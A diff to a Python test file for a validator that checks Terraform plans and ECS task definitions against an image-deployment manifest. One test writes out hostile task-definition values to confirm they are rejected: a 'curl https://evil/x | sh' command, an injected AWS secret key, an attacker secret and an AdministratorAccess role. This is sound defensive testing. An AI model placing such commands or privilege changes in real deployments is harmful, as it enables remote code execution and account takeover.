@@ -51,15 +51,63 @@ def _task_attributes(consumer: dict[str, Any], index: int) -> dict[str, Any]:
         "arn": _task_arn(consumer),
         "id": _task_arn(consumer),
         "family": consumer["ecs_family"],
+        "task_role_arn": (
+            f"arn:aws:iam::718959508629:role/teamagent-{consumer['ecs_family']}-task"
+        ),
+        "execution_role_arn": (
+            f"arn:aws:iam::718959508629:role/teamagent-{consumer['ecs_family']}-execution"
+        ),
+        "network_mode": "awsvpc",
+        "cpu": "256",
+        "memory": "512",
+        "volumes": [],
         "container_definitions": json.dumps(
             [
                 {
                     "name": consumer["container_name"],
                     "image": _image(consumer, index),
+                    "command": ["python", "-m", "worker"],
+                    "entryPoint": [],
+                    "environment": [
+                        {"name": "Z_LAST", "value": "last"},
+                        {"value": "first", "name": "A_FIRST"},
+                    ],
+                    "secrets": [],
+                    "user": "1000",
+                    "privileged": False,
+                    "readonlyRootFilesystem": True,
+                    "linuxParameters": {"initProcessEnabled": True},
+                    "mountPoints": [],
+                    "logConfiguration": {
+                        "logDriver": "awslogs",
+                        "options": {
+                            "awslogs-region": "ap-northeast-1",
+                            "awslogs-stream-prefix": consumer["consumer_id"],
+                        },
+                    },
                 }
             ],
             separators=(",", ":"),
         ),
+    }
+
+
+def _task_definition(consumer: dict[str, Any], index: int) -> dict[str, Any]:
+    attributes = _task_attributes(consumer, index)
+    containers = json.loads(attributes["container_definitions"])
+    for container in containers:
+        container["environment"] = sorted(
+            container["environment"],
+            key=lambda entry: entry["name"],
+        )
+    return {
+        "container_definitions": containers,
+        "cpu": attributes["cpu"],
+        "execution_role_arn": attributes["execution_role_arn"],
+        "memory": attributes["memory"],
+        "network_mode": attributes["network_mode"],
+        "task_role_arn": attributes["task_role_arn"],
+        "volumes": attributes["volumes"],
     }
 
 
@@ -166,6 +214,7 @@ def _consumer_manifest() -> dict[str, Any]:
         snapshot = {
             "image": _image(consumer, index),
             "task_definition_arn": _task_arn(consumer),
+            "task_definition": _task_definition(consumer, index),
             "activation": activation,
         }
         consumers.append(
@@ -336,9 +385,25 @@ def _plan() -> dict[str, Any]:
                     f"teamagent-openclaw@sha256:{'b' * 64}"
                 )
             },
-            "media_worker_image": {"value": ""},
+            "x_buzz_image": {
+                "value": (
+                    "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
+                    f"teamagent-mcp@sha256:{'c' * 64}"
+                )
+            },
+            "media_worker_image": {
+                "value": (
+                    "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
+                    f"teamagent-media-worker@sha256:{'d' * 64}"
+                )
+            },
             "tiktok_acquire_image": {"value": ""},
-            "enable_media_worker": {"value": False},
+            "enable_connect_web": {"value": True},
+            "enable_canary_health": {"value": True},
+            "enable_ingest_schedule": {"value": True},
+            "enable_morning_digest": {"value": True},
+            "enable_x_research": {"value": True},
+            "enable_media_worker": {"value": True},
             "enable_tiktok_acquire": {"value": False},
             "image_deployment_consumer_manifest": {"value": manifest},
             "image_release_receipt_catalog": {"value": {}},
@@ -351,6 +416,85 @@ def _plan() -> dict[str, Any]:
         },
         "resource_changes": changes,
     }
+
+
+def _state_instance_address(resource: dict[str, Any]) -> str:
+    base = f"{resource['type']}.{resource['name']}"
+    instance = resource["instances"][0]
+    index_key = instance.get("index_key")
+    return base if index_key is None else f"{base}[{index_key}]"
+
+
+def _consumer_resource_addresses(consumer: dict[str, Any]) -> set[str]:
+    activation_resources, _, _ = _consumer_activation(consumer)
+    return {
+        consumer["terraform_task_definition_address"],
+        *(address for address, _, _ in activation_resources),
+    }
+
+
+def _remove_consumer_from_state(
+    state: dict[str, Any],
+    consumer: dict[str, Any],
+) -> None:
+    addresses = _consumer_resource_addresses(consumer)
+    state["resources"] = [
+        resource
+        for resource in state["resources"]
+        if _state_instance_address(resource) not in addresses
+    ]
+
+
+def _make_consumer_already_absent(
+    plan: dict[str, Any],
+    state: dict[str, Any],
+    consumer_id: str,
+) -> None:
+    consumer = next(item for item in REGISTRY["consumers"] if item["consumer_id"] == consumer_id)
+    manifest_consumer = _manifest_consumer(plan, consumer_id)
+    for phase in ("live", "before", "after"):
+        manifest_consumer[phase] = {"absent": True}
+    addresses = _consumer_resource_addresses(consumer)
+    _remove_consumer_from_state(state, consumer)
+    plan["resource_changes"] = [
+        change for change in plan["resource_changes"] if change["address"] not in addresses
+    ]
+    if consumer_id == "x_buzz_worker":
+        plan["variables"]["enable_x_research"]["value"] = False
+        plan["variables"]["x_buzz_image"]["value"] = ""
+    elif consumer_id == "tiktok_acquire":
+        plan["variables"]["enable_media_worker"]["value"] = False
+        plan["variables"]["enable_tiktok_acquire"]["value"] = False
+        plan["variables"]["media_worker_image"]["value"] = ""
+        plan["variables"]["tiktok_acquire_image"]["value"] = ""
+
+
+def _make_connect_web_absent_to_present(
+    plan: dict[str, Any],
+    state: dict[str, Any],
+) -> None:
+    registry_consumer = next(
+        item for item in REGISTRY["consumers"] if item["consumer_id"] == "connect_web"
+    )
+    consumer = _manifest_consumer(plan, "connect_web")
+    consumer["live"] = {"absent": True}
+    consumer["before"] = {"absent": True}
+    address = consumer["terraform_task_definition_address"]
+    consumer["after"]["task_definition_arn"] = address
+    consumer["after"]["activation"]["task_definition_arn"] = address
+    plan["variables"]["image_deployment_consumer_manifest"]["value"]["mode"] = "receipt-required"
+    _remove_consumer_from_state(state, registry_consumer)
+
+    task_change = _resource_change(plan, address)["change"]
+    task_change["actions"] = ["create"]
+    task_change["before"] = None
+    task_change["after"]["arn"] = None
+    task_change["after"]["id"] = None
+
+    service_change = _resource_change(plan, "aws_ecs_service.connect_web[0]")["change"]
+    service_change["actions"] = ["create"]
+    service_change["before"] = None
+    service_change["after"]["task_definition"] = None
 
 
 def test_context_binds_exact_backend_workspace_state_and_plan_ownership() -> None:
@@ -520,13 +664,54 @@ def test_context_binds_only_the_generic_effective_media_worker_digest() -> None:
         "718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/"
         f"teamagent-dev-tiktok-acquire@sha256:{'c' * 64}"
     )
-    with pytest.raises(CONTEXT.ContextError, match="generic media release digest"):
+    with pytest.raises(
+        CONTEXT.ContextError,
+        match="runtime image digest is invalid: media_worker_image",
+    ):
         CONTEXT.build_context(
             plan=plan,
             state=_state(),
             backend_metadata=_backend(),
             workspace="default",
         )
+
+
+def test_runtime_binding_binds_and_type_checks_all_consumer_inputs() -> None:
+    plan = _plan()
+
+    binding = CONTEXT._runtime_image_binding(plan)
+
+    assert set(binding["images"]) == {
+        "mcp_image",
+        "openclaw_image",
+        "x_buzz_image",
+        "media_worker_image",
+        "tiktok_acquire_image",
+    }
+    assert set(binding["enable_flags"]) == {
+        "enable_connect_web",
+        "enable_canary_health",
+        "enable_ingest_schedule",
+        "enable_morning_digest",
+        "enable_x_research",
+        "enable_media_worker",
+        "enable_tiktok_acquire",
+    }
+
+    disabled = _plan()
+    disabled["variables"]["enable_x_research"]["value"] = False
+    disabled["variables"]["x_buzz_image"]["value"] = ""
+    assert CONTEXT._runtime_image_binding(disabled) != binding
+
+    invalid_flag = _plan()
+    invalid_flag["variables"]["enable_x_research"]["value"] = "false"
+    with pytest.raises(CONTEXT.ContextError, match="enable variable is invalid"):
+        CONTEXT._runtime_image_binding(invalid_flag)
+
+    invalid_image = _plan()
+    invalid_image["variables"]["x_buzz_image"]["value"] = "latest"
+    with pytest.raises(CONTEXT.ContextError, match="x_buzz_image"):
+        CONTEXT._runtime_image_binding(invalid_image)
 
 
 @pytest.mark.parametrize(
@@ -660,6 +845,131 @@ def test_consumer_manifest_derives_no_image_transition_from_exact_eight() -> Non
         CONTEXT.validate_consumer_manifest(wrong_hash)
 
 
+def test_consumer_manifest_canonicalizes_only_the_exact_absent_sentinel() -> None:
+    manifest = _consumer_manifest()
+    consumer = next(
+        item for item in manifest["consumers"] if item["consumer_id"] == "x_buzz_worker"
+    )
+    for phase in ("live", "before", "after"):
+        consumer[phase] = {"absent": True}
+
+    validated = CONTEXT.validate_consumer_manifest(manifest)
+
+    assert validated["mode"] == "no-image-transition"
+    assert all(
+        phase == {"absent": True} and CONTEXT.consumer_snapshot_is_absent(phase)
+        for phase in (
+            validated["consumers"][6]["live"],
+            validated["consumers"][6]["before"],
+            validated["consumers"][6]["after"],
+        )
+    )
+
+    malformed = json.loads(json.dumps(manifest))
+    malformed["consumers"][6]["after"] = {"absent": False}
+    with pytest.raises(CONTEXT.ContextError, match="schema mismatch"):
+        CONTEXT.validate_consumer_manifest(malformed)
+
+
+def test_consumer_manifest_requires_receipt_for_absent_to_present() -> None:
+    manifest = _consumer_manifest()
+    consumer = next(item for item in manifest["consumers"] if item["consumer_id"] == "connect_web")
+    consumer["live"] = {"absent": True}
+    consumer["before"] = {"absent": True}
+    manifest["mode"] = "receipt-required"
+
+    validated = CONTEXT.validate_consumer_manifest(manifest)
+
+    assert validated["mode"] == "receipt-required"
+
+
+def test_consumer_manifest_rejects_present_to_absent_decommission() -> None:
+    manifest = _consumer_manifest()
+    consumer = next(item for item in manifest["consumers"] if item["consumer_id"] == "connect_web")
+    consumer["after"] = {"absent": True}
+    manifest["mode"] = "receipt-required"
+
+    with pytest.raises(CONTEXT.ContextError, match="decommission"):
+        CONTEXT.validate_consumer_manifest(manifest)
+
+
+def test_registry_sha256_command_emits_external_data_source_shape(
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    assert CONTEXT.main(["registry-sha256"]) == 0
+
+    assert json.loads(capsys.readouterr().out) == {"sha256": CONTEXT.consumer_registry_sha256()}
+
+
+def test_validate_consumer_manifest_command_emits_canonical_manifest(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    manifest = _consumer_manifest()
+    manifest_path = tmp_path / "consumer-manifest.json"
+    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
+
+    assert (
+        CONTEXT.main(
+            [
+                "validate-consumer-manifest",
+                "--manifest",
+                str(manifest_path),
+            ]
+        )
+        == 0
+    )
+
+    assert json.loads(capsys.readouterr().out) == CONTEXT.validate_consumer_manifest(manifest)
+
+
+def test_consumer_manifest_normalizes_environment_order_deterministically() -> None:
+    manifest = _consumer_manifest()
+    environment = manifest["consumers"][0]["after"]["task_definition"]["container_definitions"][0][
+        "environment"
+    ]
+    environment.reverse()
+
+    validated = CONTEXT.validate_consumer_manifest(manifest)
+
+    assert validated["mode"] == "no-image-transition"
+    assert [
+        entry["name"]
+        for entry in validated["consumers"][0]["after"]["task_definition"]["container_definitions"][
+            0
+        ]["environment"]
+    ] == ["A_FIRST", "Z_LAST"]
+
+
+@pytest.mark.parametrize("collection_change", ["addition", "deletion", "reordering"])
+def test_consumer_manifest_treats_container_collection_changes_as_receipt_required(
+    collection_change: str,
+) -> None:
+    manifest = _consumer_manifest()
+    task_definitions = [
+        manifest["consumers"][0][phase]["task_definition"] for phase in ("live", "before", "after")
+    ]
+    sidecar = json.loads(json.dumps(task_definitions[0]["container_definitions"][0]))
+    sidecar["name"] = "security-sidecar"
+    sidecar["image"] = (
+        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'e' * 64}"
+    )
+    if collection_change == "addition":
+        task_definitions[2]["container_definitions"].append(sidecar)
+    else:
+        for task_definition in task_definitions:
+            task_definition["container_definitions"].append(json.loads(json.dumps(sidecar)))
+        if collection_change == "deletion":
+            task_definitions[2]["container_definitions"].pop()
+        else:
+            task_definitions[2]["container_definitions"].reverse()
+    manifest["mode"] = "receipt-required"
+
+    validated = CONTEXT.validate_consumer_manifest(manifest)
+
+    assert validated["mode"] == "receipt-required"
+
+
 def test_activation_enable_requires_receipt_mode_and_rejects_mode_downgrade() -> None:
     plan = _plan()
     canary = _manifest_consumer(plan, "canary")
@@ -688,25 +998,316 @@ def test_activation_enable_requires_receipt_mode_and_rejects_mode_downgrade() ->
 
 
 @pytest.mark.parametrize(
-    "mutation",
+    ("mutation", "message"),
     [
-        lambda manifest: manifest["consumers"][0].update(release_repository="hostile"),
-        lambda manifest: manifest["consumers"][0]["after"].update(image=None),
-        lambda manifest: manifest["consumers"][0]["before"].update(
-            image=(
-                f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
-            )
+        (
+            lambda manifest: manifest["consumers"][0].update(release_repository="hostile"),
+            "identity does not match",
+        ),
+        (
+            lambda manifest: manifest["consumers"][0]["after"].update(image=None),
+            r"after\.image is not the registry repository digest",
         ),
     ],
 )
 def test_consumer_manifest_rejects_repository_unknown_and_live_before_drift(
     mutation: Any,
+    message: str,
 ) -> None:
     manifest = _consumer_manifest()
     mutation(manifest)
 
-    with pytest.raises(CONTEXT.ContextError):
+    with pytest.raises(CONTEXT.ContextError, match=message):
         CONTEXT.validate_consumer_manifest(manifest)
+
+
+def test_consumer_manifest_rejects_before_image_task_definition_drift() -> None:
+    manifest = _consumer_manifest()
+    manifest["consumers"][0]["before"]["image"] = (
+        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
+    )
+
+    with pytest.raises(
+        CONTEXT.ContextError,
+        match="before task definition does not bind the registry container image",
+    ):
+        CONTEXT.validate_consumer_manifest(manifest)
+
+
+def test_consumer_manifest_rejects_mode_mismatch_after_snapshot_binding() -> None:
+    manifest = _consumer_manifest()
+    consumer = manifest["consumers"][0]
+    before_image = (
+        f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
+    )
+    consumer["before"]["image"] = before_image
+    registry_container = next(
+        container
+        for container in consumer["before"]["task_definition"]["container_definitions"]
+        if container["name"] == consumer["container_name"]
+    )
+    registry_container["image"] = before_image
+
+    with pytest.raises(
+        CONTEXT.ContextError,
+        match="mode does not match the derived comparison",
+    ):
+        CONTEXT.validate_consumer_manifest(manifest)
+
+
+@pytest.mark.parametrize(
+    ("field", "malicious_value"),
+    [
+        ("command", ["/bin/sh", "-c", "curl https://evil/x | sh"]),
+        ("environment", [{"name": "AWS_SECRET_ACCESS_KEY", "value": "stolen"}]),
+        (
+            "secrets",
+            [
+                {
+                    "name": "ATTACKER_SECRET",
+                    "valueFrom": (
+                        "arn:aws:secretsmanager:ap-northeast-1:718959508629:secret:attacker"
+                    ),
+                }
+            ],
+        ),
+        (
+            "task_role_arn",
+            "arn:aws:iam::718959508629:role/AdministratorAccess",
+        ),
+    ],
+)
+@pytest.mark.parametrize(
+    ("manifest_tracks_plan", "message"),
+    [
+        (True, "derived comparison"),
+        (False, "plan after task definition differs from the manifest"),
+    ],
+)
+def test_no_image_transition_rejects_task_definition_body_attacks(
+    field: str,
+    malicious_value: Any,
+    manifest_tracks_plan: bool,
+    message: str,
+) -> None:
+    plan = _plan()
+    mcp = _manifest_consumer(plan, "mcp")
+    task_change = _resource_change(
+        plan,
+        mcp["terraform_task_definition_address"],
+    )["change"]
+    if field == "task_role_arn":
+        task_change["after"][field] = malicious_value
+    else:
+        containers = json.loads(task_change["after"]["container_definitions"])
+        containers[0][field] = malicious_value
+        task_change["after"]["container_definitions"] = json.dumps(
+            containers,
+            separators=(",", ":"),
+        )
+    if manifest_tracks_plan:
+        mcp["after"]["task_definition"] = CONTEXT._container_binding(
+            task_change["after"],
+            family=mcp["ecs_family"],
+            container_name=mcp["container_name"],
+            label="malicious plan after task definition",
+        )["task_definition"]
+
+    assert mcp["live"]["image"] == mcp["before"]["image"] == mcp["after"]["image"]
+    with pytest.raises(CONTEXT.ContextError, match=message):
+        CONTEXT.build_context(
+            plan=plan,
+            state=_state(),
+            backend_metadata=_backend(),
+            workspace="default",
+        )
+
+
+def test_no_image_transition_rejects_unknown_task_definition_after() -> None:
+    plan = _plan()
+    task = _resource_change(
+        plan,
+        REGISTRY["consumers"][0]["terraform_task_definition_address"],
+    )
+    task["change"]["after_unknown"] = {"container_definitions": True}
+
+    with pytest.raises(
+        CONTEXT.ContextError,
+        match=re.escape("plan after task definition.container_definitions is unknown"),
+    ):
+        CONTEXT.build_context(
+            plan=plan,
+            state=_state(),
+            backend_metadata=_backend(),
+            workspace="default",
+        )
+
+
+@pytest.mark.parametrize(
+    ("mismatch", "message"),
+    [
+        ("live_image", "live task definition differs from the manifest"),
+        ("live_arn", "live task definition differs from the manifest"),
+        ("live_body", "live task definition differs from the manifest"),
+        ("before_image", "plan before task definition differs from the manifest"),
+        ("before_arn", "plan before task definition differs from the manifest"),
+        ("before_body", "plan before task definition differs from the manifest"),
+        ("after_image", "plan after task definition differs from the manifest"),
+        ("after_arn", "plan after task definition differs from the manifest"),
+        ("after_body", "plan after task definition differs from the manifest"),
+        ("missing", "consumer set does not match"),
+        ("extra", "consumer set does not match"),
+    ],
+)
+def test_manifest_plan_binding_rejects_manifest_state_disagreement(
+    mismatch: str,
+    message: str,
+) -> None:
+    manifest = CONTEXT.validate_consumer_manifest(_consumer_manifest())
+    first = manifest["consumers"][0]
+    if mismatch.endswith("_image"):
+        phase = mismatch.removesuffix("_image")
+        first[phase]["image"] = (
+            f"718959508629.dkr.ecr.ap-northeast-1.amazonaws.com/teamagent-mcp@sha256:{'f' * 64}"
+        )
+    elif mismatch.endswith("_arn"):
+        phase = mismatch.removesuffix("_arn")
+        first[phase]["task_definition_arn"] = _task_arn(
+            REGISTRY["consumers"][0],
+            revision=2,
+        )
+    elif mismatch.endswith("_body"):
+        phase = mismatch.removesuffix("_body")
+        first[phase]["task_definition"]["task_role_arn"] = (
+            "arn:aws:iam::718959508629:role/AdministratorAccess"
+        )
+    elif mismatch == "missing":
+        manifest["consumers"].pop()
+    else:
+        manifest["consumers"].append(json.loads(json.dumps(first)))
+
+    with pytest.raises(CONTEXT.ContextError, match=message):
+        CONTEXT._manifest_plan_binding(
+            manifest=manifest,
+            plan=_plan(),
+            state=_state(),
+        )
+
+
+def test_manifest_plan_binding_rejects_consumer_absent_from_live_state() -> None:
+    state = _state()
+    address = REGISTRY["consumers"][0]["terraform_task_definition_address"]
+    state["resources"] = [
+        resource
+        for resource in state["resources"]
+        if not (
+            resource["type"] == "aws_ecs_task_definition"
+            and f"{resource['type']}.{resource['name']}" == address
+        )
+    ]
+
+    with pytest.raises(CONTEXT.ContextError, match="absent from state"):
+        CONTEXT._manifest_plan_binding(
+            manifest=CONTEXT.validate_consumer_manifest(_consumer_manifest()),
+            plan=_plan(),
+            state=state,
+        )
+
+
+def test_context_accepts_already_disabled_consumer_only_when_resources_are_absent() -> None:
+    plan = _plan()
+    state = _state()
+    _make_consumer_already_absent(plan, state, "x_buzz_worker")
+
+    value = CONTEXT.build_context(
+        plan=plan,
+        state=state,
+        backend_metadata=_backend(),
+        workspace="default",
+    )
+
+    assert value["consumer_manifest"]["mode"] == "no-image-transition"
+    x_consumer = next(
+        consumer
+        for consumer in value["consumer_manifest"]["consumers"]
+        if consumer["consumer_id"] == "x_buzz_worker"
+    )
+    assert x_consumer["live"] == x_consumer["before"] == x_consumer["after"] == {"absent": True}
+
+    state_with_hidden_task = _state()
+    with pytest.raises(CONTEXT.ContextError, match="must be absent from state"):
+        CONTEXT.build_context(
+            plan=plan,
+            state=state_with_hidden_task,
+            backend_metadata=_backend(),
+            workspace="default",
+        )
+
+
+def test_context_absent_to_present_requires_receipt_and_exact_create_actions() -> None:
+    plan = _plan()
+    state = _state()
+    _make_connect_web_absent_to_present(plan, state)
+
+    value = CONTEXT.build_context(
+        plan=plan,
+        state=state,
+        backend_metadata=_backend(),
+        workspace="default",
+    )
+
+    assert value["consumer_manifest"]["mode"] == "receipt-required"
+    connect_web = next(
+        consumer
+        for consumer in value["consumer_manifest"]["consumers"]
+        if consumer["consumer_id"] == "connect_web"
+    )
+    assert connect_web["live"] == connect_web["before"] == {"absent": True}
+    assert not CONTEXT.consumer_snapshot_is_absent(connect_web["after"])
+
+    wrong_action = _plan()
+    wrong_action_state = _state()
+    _make_connect_web_absent_to_present(wrong_action, wrong_action_state)
+    _resource_change(
+        wrong_action,
+        "aws_ecs_task_definition.connect_web[0]",
+    )["change"]["actions"] = ["delete", "create"]
+    with pytest.raises(CONTEXT.ContextError, match="must be a create"):
+        CONTEXT.build_context(
+            plan=wrong_action,
+            state=wrong_action_state,
+            backend_metadata=_backend(),
+            workspace="default",
+        )
+
+
+def test_absent_manifest_cannot_hide_a_planned_consumer_create() -> None:
+    plan = _plan()
+    state = _state()
+    _make_consumer_already_absent(plan, state, "x_buzz_worker")
+    registry_consumer = next(
+        consumer for consumer in REGISTRY["consumers"] if consumer["consumer_id"] == "x_buzz_worker"
+    )
+    attributes = _task_attributes(registry_consumer, 6)
+    plan["resource_changes"].append(
+        {
+            "address": registry_consumer["terraform_task_definition_address"],
+            "mode": "managed",
+            "change": {
+                "actions": ["create"],
+                "before": None,
+                "after": attributes,
+            },
+        }
+    )
+
+    with pytest.raises(CONTEXT.ContextError, match="must have no planned resource"):
+        CONTEXT.build_context(
+            plan=plan,
+            state=state,
+            backend_metadata=_backend(),
+            workspace="default",
+        )
 
 
 @pytest.mark.parametrize("binding", ["catalog", "consumer", "channel"])
@@ -798,6 +1399,20 @@ def test_public_activation_state_validator_rechecks_all_eight_after_apply() -> N
         phase="after",
     )
     assert resolved["consumer_count"] == 8
+
+    disabled_plan = _plan()
+    disabled_state = _state()
+    _make_consumer_already_absent(
+        disabled_plan,
+        disabled_state,
+        "x_buzz_worker",
+    )
+    disabled = CONTEXT.validate_consumer_activation_state(
+        disabled_plan["variables"]["image_deployment_consumer_manifest"]["value"],
+        disabled_state,
+        phase="after",
+    )
+    assert disabled["consumer_count"] == 8
 
     drifted_state = _state()
     canary_rule = next(
